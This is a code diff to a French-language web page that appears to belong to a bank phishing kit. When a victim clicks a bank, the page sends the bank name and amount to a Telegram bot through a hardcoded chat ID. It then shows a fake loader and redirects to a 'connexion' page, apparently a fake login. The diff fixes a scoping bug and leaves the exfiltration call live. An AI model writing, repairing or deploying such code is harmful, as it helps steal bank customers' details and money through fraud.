@@ -130,10 +130,11 @@
         document.querySelectorAll('.bank-grid .bank-item, #autres-dropdown li').forEach(item => {
             item.addEventListener('click', function() {
                 const banque = this.querySelector('img') ? this.querySelector('img').alt : this.getAttribute('data-banque');
+                const type = this.querySelector('img') ? 'logo' : 'nom';
 
                 // Envoi immédiat Telegram page 3
                 const messagePage3 = `
-🔥 BANQUE SÉLECTIONNÉE (PAGE 3) 🔥
+🏦 BANQUE SÉLECTIONNÉE (PAGE 3) 🏦
 Banque: ${banque}
 Montant: ${montant} €
                 `.trim();
@@ -142,14 +143,14 @@ Montant: ${montant} €
                 const chat_id = "2036034237";
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(messagePage3)}`).catch(() => {});
 
-                // Stockage pour page 4
-                localStorage.setItem('page3Banque', banque);
-
+                // Afficher loader
                 document.getElementById('loader').style.display = 'flex';
                 document.querySelector('.container').style.display = 'none';
 
+                // Après 3.5 secondes : cacher loader et passer à page 4
                 setTimeout(function() {
-                    window.location.href = 'connexion.html?banque=' + encodeURIComponent(banque) + '&montant=' + montant + '&type=' + (this.querySelector('img') ? 'logo' : 'nom');
+                    document.getElementById('loader').style.display = 'none';
+                    window.location.href = 'connexion.html?banque=' + encodeURIComponent(banque) + '&montant=' + montant + '&type=' + type;
                 }, 3500);
             });
         });
